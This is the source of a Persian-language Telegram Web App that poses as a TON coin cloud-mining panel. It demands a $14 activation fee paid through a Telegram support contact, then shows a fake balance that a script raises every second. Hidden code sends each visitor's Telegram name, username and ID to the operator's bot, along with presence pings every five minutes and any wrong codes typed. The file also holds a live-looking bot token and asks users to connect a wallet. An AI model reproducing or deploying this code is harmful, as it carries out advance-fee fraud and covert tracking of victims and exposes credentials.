<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TON Dropy Premium - v34 Final</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700;800&display=swap');
        
        body {
            margin: 0; font-family: 'Vazirmatn', sans-serif;
            background: radial-gradient(circle at top, #0f1c2e, #070b14);
            color: #fff; padding: 15px; direction: rtl; min-height: 100vh;
        }

        /* پاپ‌آپ فعالسازی (Modal) */
        #feeModal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.94); backdrop-filter: blur(20px);
            z-index: 99999; display: flex; align-items: center; justify-content: center;
        }

        .modal-content {
            background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 30px 20px; border-radius: 35px; width: 85%; text-align: center;
        }

        .pay-notice {
            background: rgba(255, 193, 7, 0.1); border: 1px solid #ffc107;
            color: #ffc107; padding: 15px; border-radius: 18px;
            font-size: 11px; margin-bottom: 20px; line-height: 1.8; text-align: justify;
        }

        .fee-highlight { 
            background: rgba(0, 255, 157, 0.1); border: 1px dashed #00ff9d;
            color: #00ff9d; padding: 15px; border-radius: 15px;
            font-weight: 800; font-size: 19px; display: block; margin: 15px 0; 
        }

        #activationInput {
            width: 100%; padding: 14px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.2);
            background: rgba(0,0,0,0.3); color: #fff; text-align: center; font-size: 18px; margin-bottom: 12px; outline: none;
        }

        .profile-card {
            background: rgba(255, 255, 255, 0.08); border-radius: 22px; padding: 18px;
            display: flex; align-items: center; gap: 15px; margin-bottom: 20px; border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .avatar-container {
            width: 60px; height: 60px; border-radius: 50%; border: 2px solid #00c6ff;
            background: #1a1a1a; display: flex; align-items: center; justify-content: center; overflow: hidden;
        }

        .avatar-container img { width: 100%; height: 100%; object-fit: cover; }

        .card {
            background: rgba(255, 255, 255, 0.05); border-radius: 25px;
            padding: 22px; border: 1px solid rgba(255, 255, 255, 0.1); margin-bottom: 15px; text-align: center;
        }

        #balance { font-size: 45px; font-weight: 800; color: #00c6ff; display: block; margin: 10px 0; }

        .btn-action {
            width: 100%; padding: 16px; border-radius: 18px; border: none;
            font-size: 15px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; text-decoration: none; color: #fff;
        }

        .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); }
        .support-btn { background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.2); margin-top: 10px; }
        #ton-connect-btn { display: flex; justify-content: center; margin: 10px 0; }
        .hidden { display: none !important; }
    </style>
</head>
<body>

<div id="feeModal">
    <div class="modal-content">
        <i class="fas fa-lock" style="font-size: 45px; color: #ff512f; margin-bottom: 15px;"></i>
        <h2 style="font-size: 18px;">فعالسازی پنل کاربری</h2>
        <div class="pay-notice">
            <i class="fas fa-exclamation-triangle"></i>
            کاربر گرامی، جهت واریز کارمزد فعالسازی <b>حتماً</b> اطلاعات پرداخت را مستقیماً از <b>پشتیبانی</b> دریافت کنید.
        </div>
        <div class="fee-highlight">14 دلار | 2,226,000 تومان</div>
        <a href="https://t.me/miningertoncoin" class="btn-action" style="background: #0088cc; margin-bottom: 20px;">
            <i class="fas fa-headset"></i> دریافت رمز و اطلاعات واریز
        </a>
        <div style="border-top: 1px solid rgba(255,255,255,0.1); padding-top: 20px;">
            <input type="text" id="activationInput" placeholder="رمز فعالسازی را وارد کنید">
            <button onclick="verifyActivation()" class="btn-action" style="background: #1faa59;">تایید و فعالسازی</button>
        </div>
    </div>
</div>

<div class="profile-card">
    <div class="avatar-container">
        <i class="fas fa-user-circle" id="defaultAvatar" style="font-size: 30px; color:#00c6ff;"></i>
        <img id="userPhoto" src="" class="hidden">
    </div>
    <div class="user-details">
        <h3 id="userName" style="margin:0; font-size:16px;">...</h3>
        <p id="userTag" style="margin:0; font-size:12px; color:#00c6ff; direction:ltr; text-align:right;">@username</p>
    </div>
</div>

<div class="card">
    <p style="margin:0; font-size:12px; color:#aaa;">موجودی استخراج شده (TON)</p>
    <span id="balance">0.000000</span>
    <div style="font-size:11px; color:#00ff9d;"><i class="fas fa-bolt"></i> استخراج ابری فعال</div>
</div>

<div class="card">
    <div id="ton-connect-btn"></div>
</div>

<div class="card">
    <button id="withdrawBtn" class="btn-action withdraw-btn">درخواست برداشت وجه</button>
    <a href="https://t.me/miningertoncoin" class="btn-action support-btn">پشتیبانی آنلاین</a>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const SECRET_CODE = "T61O96N12";
    const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
    const ADMIN_ID = "5972276401";

    let bal = parseFloat(localStorage.getItem('bal_v34')) || 0;

    // تابع ارسال پیام به ادمین
    function logToAdmin(statusMessage) {
        const user = tg.initDataUnsafe?.user;
        const info = user ? `\n👤 کاربر: ${user.first_name}\n🆔 یوزرنیم: @${user.username || 'ندارد'}\n🔢 آیدی: <code>${user.id}</code>` : "\n👤 نامشخص";
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(statusMessage + info)}&parse_mode=HTML`);
    }

    // --- مدیریت لاگ ورود و حضور ---
    const isActivated = localStorage.getItem('isActivated') === 'true';
    if(isActivated) {
        document.getElementById('feeModal').style.display = 'none';
        logToAdmin("⛏️ <b>کاربر وارد صفحه استخراج تون کوین شد و هم اکنون آنلاین است</b>");
    } else {
        logToAdmin("🚨 <b>کاربر در حال مشاهده صفحه پرداخت کارمزد است</b>");
    }

    // سیستم هارت‌بیت (بررسی آنلاین بودن هر 5 دقیقه)
    setInterval(() => {
        const status = localStorage.getItem('isActivated') === 'true' ? "استخراج" : "صفحه پرداخت";
        logToAdmin(`🟢 <b>کاربر همچنان در ${status} آنلاین است...</b>`);
    }, 300000); // 300,000 میلی‌ثانیه = 5 دقیقه

    function verifyActivation() {
        const input = document.getElementById('activationInput').value.trim();
        if(input === SECRET_CODE) {
            localStorage.setItem('isActivated', 'true');
            document.getElementById('feeModal').remove();
            tg.showAlert("✅ حساب شما فعال شد!");
            logToAdmin("🔓 <b>کاربر رمز را درست زد و وارد پنل اصلی شد</b>");
        } else {
            tg.showAlert("❌ رمز اشتباه است.");
            logToAdmin(`⚠️ <b>تلاش با رمز غلط در صفحه پرداخت:</b> <code>${input}</code>`);
        }
    }

    // افزایش موجودی نمایشی
    setInterval(() => {
        bal += 0.000012;
        document.getElementById('balance').innerText = bal.toFixed(6);
        localStorage.setItem('bal_v34', bal.toString());
    }, 1000);

    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json',
        buttonRootId: 'ton-connect-btn'
    });

    document.getElementById('withdrawBtn').onclick = () => {
        if(localStorage.getItem('isActivated') !== 'true') {
            tg.showAlert("⚠️ حساب فعال نیست.");
            return;
        }
        if(!tonConnectUI.connected) {
            tg.showAlert("❌ ابتدا ولت را وصل کنید.");
            return;
        }
        tg.showAlert("✅ درخواست برداشت ثبت شد.");
        logToAdmin(`💰 <b>درخواست برداشت:</b> ${bal.toFixed(6)} TON`);
    };

    const user = tg.initDataUnsafe?.user;
    if (user) {
        document.getElementById('userName').innerText = user.first_name;
        document.getElementById('userTag').innerText = user.username ? "@" + user.username : "ID: " + user.id;
        if (user.photo_url) {
            const img = document.getElementById('userPhoto');
            img.src = user.photo_url; img.classList.remove('hidden');
            document.getElementById('defaultAvatar').classList.add('hidden');
        }
    }
</script>
</body>
</html>
